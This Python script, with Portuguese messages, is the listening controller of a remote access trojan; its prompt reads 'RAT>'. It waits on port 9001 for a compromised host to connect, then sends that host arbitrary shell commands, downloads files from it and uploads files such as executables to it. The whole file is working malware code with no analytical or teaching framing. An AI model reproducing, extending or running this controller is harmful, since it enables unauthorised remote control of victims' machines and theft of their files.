import socket
import os

PORT = 9001

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server.bind(("0.0.0.0", PORT))
server.listen(1)
print(f"[*] Aguardando conexão na porta {PORT}...")

conn, addr = server.accept()
print(f"[*] Conexão estabelecida com {addr}")

banner = conn.recv(4096).decode(errors="ignore")
print(banner.strip())

while True:
    try:
        command = input("RAT> ")
        if not command.strip():
            continue

        conn.send((command + "\n").encode())

        if command.lower().startswith("download"):
            header_bytes = bytearray()
            while not header_bytes.endswith(b"\n"):
                chunk = conn.recv(1)
                if not chunk:
                    break
                header_bytes.extend(chunk)
            
            header = header_bytes.decode(errors="ignore").strip()

            if header.startswith("FILE_START:"):
                _, filename, filesize = header.split(":")
                filesize = int(filesize)
                
                print(f"[*] Baixando '{filename}' ({filesize} bytes)...")
                
                received = 0
                with open(filename, "wb") as f:
                    while received < filesize:
                        to_read = min(filesize - received, 4096)
                        chunk = conn.recv(to_read)
                        if not chunk:
                            break
                        f.write(chunk)
                        received += len(chunk)
                        
                print(f"[+] Download concluído: {filename}")
            else:
                print(header)

        elif command.lower().startswith("upload"):
                    try:
                        parts = command.split(" ", 1)
                        if len(parts) < 2:
                            print("[!] Erro: Especifique o arquivo. Ex: upload teste.exe")
                            continue
                        
                        filename = parts[1].strip()
                        filepath = os.path.join(os.getcwd(), filename)

                        if not os.path.exists(filepath):
                            print(f"[!] Erro: Arquivo {filename} não encontrado localmente.")
                            continue

                        filesize = os.path.getsize(filepath)
                        
                        payload = f"{filename}|{filesize}\n"
                        conn.send(payload.encode())
                        
                        print(f"[*] Enviando '{filename}' ({filesize} bytes)...")
                        with open(filepath, "rb") as f:
                            while True:
                                chunk = f.read(4096)
                                if not chunk:
                                    break
                                conn.send(chunk)
                        
                        response = conn.recv(8192).decode(errors="ignore")
                        print(response.strip())

                    except Exception as e:
                        print(f"[!] Erro no upload: {e}")

        else:
            response = conn.recv(8192).decode(errors="ignore")
            print(response.strip())
            
    except KeyboardInterrupt:
        print("\n[*] Encerrando listener...")
        conn.close()
        break
    except Exception as e:
        print(f"[!] Erro de conexão: {e}")
        break
